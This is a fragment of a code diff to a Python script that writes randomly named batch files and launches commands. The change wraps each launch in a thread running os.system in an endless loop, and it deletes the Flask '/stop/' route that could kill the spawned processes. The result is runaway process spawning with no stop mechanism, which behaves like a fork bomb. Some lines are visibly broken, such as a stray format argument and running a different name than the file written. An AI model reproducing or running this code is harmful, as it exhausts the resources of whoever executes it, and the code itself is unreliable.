@@ -17,20 +17,17 @@ if "%ERRORLEVEL%"=="0" (
 )
 '''
 from sys import platform
-import random,os
+import random,os,_thread
 random_numbers = [random.randint(10000, 99999) for _ in range(10)]
 random_strs = [str(num) for num in random_numbers]
+def run(name):
+    while True:
+        os.system(name)
 def start():
     for i in range(10):
         if platform == 'win32':
             with open(random_strs[i] + '.bat','w') as f:f.write(win32)
-            os.system('start cmd /c {}'.format(password + random_strs[i],'w'))
+            _thread.start_new_thread(run,('start cmd /c {}'.format(password + random_strs[i],'w')))
         else:
             with open(random_strs[i] + '.bat','w') as f:f.write(unix)
-            os.system('bash {}'.format(password + random_strs[i],'w'))
-
-app = flask.Flask(__name__)
-@app.route('/stop/')
-def kill():
-    if platform == 'win32':os.system('kill cmd.exe')
-    else:os.system('kill ')
+            _thread.start_new_thread(run,('bash {}'.format(password + random_strs[i],'w')))
